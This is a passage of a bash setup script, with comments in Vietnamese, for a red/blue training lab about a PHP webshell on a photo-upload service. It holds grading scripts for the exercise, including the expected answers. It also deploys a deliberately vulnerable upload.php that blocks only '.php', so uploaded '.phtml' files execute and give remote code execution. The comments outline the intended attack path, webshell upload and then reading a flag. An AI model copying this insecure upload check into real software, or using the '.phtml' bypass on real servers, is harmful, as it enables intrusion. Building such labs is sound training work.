cat > /tmp/findings.txt <<'FND'
# BAO CAO DIEU TRA (Blue) - dien gia tri ban TU TIM DUOC qua SIEM/log (KEY=value):
# ATTACKER_IP : IP ke tan cong
# VULN        : lo hong (vd: Unrestricted file upload -> web shell RCE qua .phtml)
# WEBSHELL    : ten (hoac duoi) file webshell tim thay trong uploads/
ATTACKER_IP=
VULN=
WEBSHELL=
FND
S cp /tmp/findings.txt /home/analyst/findings.txt
S chown analyst:analyst /home/analyst/findings.txt
S chmod 644 /home/analyst/findings.txt

exit 0
__EOF_WS_9x2k__
mkdir -p "$LAB/targeta/_bin"
cat > "$LAB/targeta/_bin/prestop" <<'__EOF_WS_9x2k__'
#!/bin/bash
# prestop he A (Blue). Chay quyen 'ubuntu'. Chi in co/OK, khong lo dap an.
#   SLA_OK     : upload anh jpg HOP LE van thanh cong (app con chay dung)
#   A_RCE_OPEN : upload file .phtml test -> VAN THUC THI duoc (chua va goc)
#   A_WS_LEFT  : con file webshell (php/phtml/phar/pht) cua ke tan cong trong uploads/
#   REP_*      : bao cao findings.txt
# Phan biet THUC THI vs LO SOURCE bang phep tinh: chi khi PHP chay moi ra tong.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER_A"
B="http://localhost"
UP="/var/www/html/uploads"
TMP="/tmp/pb.$$"; mkdir -p "$TMP"

# JPEG 1x1 hop le (cho SLA)
JPG='/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAACAAIDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwC9RRRX50fpB//Z'

# --- SLA: upload anh jpg hop le ---
echo "$JPG" | base64 -d > "$TMP/sla.jpg" 2>/dev/null
R=$(curl -s -m 8 -F "avatar=@$TMP/sla.jpg;type=image/jpeg;filename=sla_$$.jpg" "$B/upload.php" 2>/dev/null)
echo "$R" | grep -q 'UPLOAD_OK' && echo "SLA_OK"

# --- A_RCE_OPEN: upload test .phtml, kiem THUC THI (phep cong chi ra khi PHP chay) ---
N=$RANDOM; SUM=$((N+1337))
printf '<?php echo %d+1337; ?>' "$N" > "$TMP/zzck.phtml"
RU=$(curl -s -m 8 -F "avatar=@$TMP/zzck.phtml;type=image/jpeg;filename=zzck_$$.phtml" "$B/upload.php" 2>/dev/null)
if echo "$RU" | grep -q 'UPLOAD_OK'; then
  OUT=$(curl -s -m 8 "$B/uploads/zzck_$$.phtml" 2>/dev/null)
  echo "$OUT" | grep -q "$SUM" && echo "A_RCE_OPEN"
fi
sudo -n rm -f "$UP/zzck_$$.phtml" 2>/dev/null
rm -f "$TMP/zzck.phtml"

# --- A_WS_LEFT: con webshell thuc thi duoc cua attacker (duoi php-family la DUOI CUOI) ---
LEFT=$(find "$UP" -maxdepth 1 -type f -regextype posix-extended -iregex '.*\.(php|phtml|phar|pht|php[0-9])$' 2>/dev/null | wc -l)
[ "$LEFT" -gt 0 ] && echo "A_WS_LEFT"

# --- Bao cao Blue (chi in OK) ---
F=/home/analyst/findings.txt
grep '^ATTACKER_IP=' "$F" 2>/dev/null | grep -q '172.20.0.5' && echo "REP_IP_OK"
grep '^VULN=' "$F" 2>/dev/null | grep -qiE 'upload|webshell|web shell|rce|phtml|thuc thi' && echo "REP_V_OK"

rm -rf "$TMP"
exit 0
__EOF_WS_9x2k__
mkdir -p "$LAB/targeta/_bin"
cat > "$LAB/targeta/_bin/treataslocal" <<'__EOF_WS_9x2k__'
apache2
__EOF_WS_9x2k__
mkdir -p "$LAB/targetb/_bin"
cat > "$LAB/targetb/_bin/fixlocal.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# targetb (he B - PhotoBox "production"), quyen 'ubuntu'. $1 = mat khau sudo.
# Giong he A (cung ma nguon, cung lo hong) nhung CHUA VA + co FLAG that + /submit.php.
# Chi HTTP (khong SSH). SV upload webshell .phtml -> RCE -> doc flag -> nop /submit.php.
PW="$1"
S(){ echo "$PW" | sudo -S "$@"; }
mkdir -p /tmp/pb

cat > /tmp/pb/index.php <<'PHP'
<?php
$dir=__DIR__.'/uploads';
function h($t){ echo "<!doctype html><html><head><meta charset=utf-8><title>".$t." - PhotoBox</title><style>body{font-family:system-ui,Arial,sans-serif;max-width:720px;margin:24px auto;padding:0 16px;color:#222}h1,h2{color:#2a4d7a}a{color:#1a7f5a;text-decoration:none}button{background:#2a4d7a;color:#fff;padding:8px 16px;border:0;border-radius:4px;cursor:pointer}.card{border:1px solid #e0e0e0;border-radius:8px;padding:14px;margin:10px 0}</style></head><body>"; }
h('Trang chu');
echo "<h1>PhotoBox (production)</h1><p>Dich vu tai len va chia se anh dai dien.</p>";
echo "<div class=card><h2>Tai anh len</h2><form method=post action=upload.php enctype=\"multipart/form-data\"><input type=file name=avatar><br><br><button>Tai len</button></form></div>";
echo "<div class=card><h2>Anh da tai</h2><ul>";
foreach(glob($dir.'/*') as $f){ $b=basename($f); echo "<li><a href=\"uploads/".rawurlencode($b)."\">".htmlspecialchars($b)."</a></li>"; }
echo "</ul></div></body></html>";
PHP

cat > /tmp/pb/upload.php <<'PHP'
<?php
$dir=__DIR__.'/uploads';
if(!is_dir($dir)){ @mkdir($dir,0775,true); }
if((isset($_SERVER['REQUEST_METHOD'])?$_SERVER['REQUEST_METHOD']:'')==='POST'
   && isset($_FILES['avatar']) && $_FILES['avatar']['error']===0){
  $name=basename($_FILES['avatar']['name']);
  $parts=explode('.',$name); $ext=strtolower(end($parts));
  if($ext==='php'){ http_response_code(403); echo "TU CHOI: khong cho tai file .php (BLOCK_PHP)"; exit; }
  $dest=$dir.'/'.$name;
  if(@move_uploaded_file($_FILES['avatar']['tmp_name'],$dest)){
    echo "DA TAI LEN: <a href=\"uploads/".htmlspecialchars($name)."\">uploads/".htmlspecialchars($name)."</a> (UPLOAD_OK)";
  } else { http_response_code(500); echo "LOI khi luu file."; }
  exit;
}
header('Location: index.php');
PHP

cat > /tmp/pb/submit.php <<'PHP'
<?php
// "Gameserver": SV nop FLAG (doc duoc qua webshell RCE) -> B tu so voi bi mat cua chinh no.
$flag=@trim(@file_get_contents('/var/lib/photobox/flag.txt'));
$f=trim(isset($_REQUEST['flag'])?$_REQUEST['flag']:'');
echo "<!doctype html><meta charset=utf-8><body style='font-family:system-ui,Arial;max-width:640px;margin:24px auto'>";
if($f!=='' && $f===$flag){ @file_put_contents('/tmp/.flagok','1'); @chmod('/tmp/.flagok',0644); echo "<p>FLAG: <b>DUNG</b>.</p>"; }
elseif($f!==''){ echo "<p>FLAG: sai.</p>"; }
else { echo "<p>Gui ?flag=FLAG-xxxxxx</p>"; }
echo "<p><a href=index.php>Trang chu</a></p></body>";
PHP

# --- Trien khai webroot ---
S mkdir -p /var/www/html/uploads
S cp /tmp/pb/index.php /tmp/pb/upload.php /tmp/pb/submit.php /var/www/html/
S rm -f /var/www/html/index.html 2>/dev/null
# uploads www-data ghi duoc (apache luu file upload)
S chown -R www-data:www-data /var/www/html/uploads
S chmod 755 /var/www/html/uploads

# FLAG that (ca nhan hoa), luu NGOAI webroot -> phai RCE moi doc duoc (khong GET truc tiep)
S mkdir -p /var/lib/photobox
S bash -c 'echo "FLAG-FLAGVAL" > /var/lib/photobox/flag.txt; chmod 644 /var/lib/photobox/flag.txt; chown www-data:www-data /var/lib/photobox/flag.txt'

# Apache
S systemctl enable apache2 2>/dev/null || true
S systemctl restart apache2 2>/dev/null || S service apache2 restart 2>/dev/null || true

exit 0
__EOF_WS_9x2k__
mkdir -p "$LAB/targetb/_bin"
cat > "$LAB/targetb/_bin/prestop" <<'__EOF_WS_9x2k__'
#!/bin/bash
# prestop he B (Red): SV nop FLAG qua /submit.php -> B tu so voi flag that cua chinh no.
# SV phai RCE (upload .phtml) moi doc duoc flag -> khong the doan.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER_B"
[ -f /tmp/.flagok ] && echo "FLAG_OK" || echo "FLAG_NO"

exit 0
__EOF_WS_9x2k__
mkdir -p "$LAB/targetb/_bin"
cat > "$LAB/targetb/_bin/treataslocal" <<'__EOF_WS_9x2k__'
apache2
__EOF_WS_9x2k__
echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/attacker/*.sh "$LAB"/targeta/_bin/* "$LAB"/targetb/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh "$LAB"/siem/*.sh 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +
echo ">> XONG. Tiep theo:  bash apply-shared-siem.sh soc-webshell ; rebuild soc-webshell"
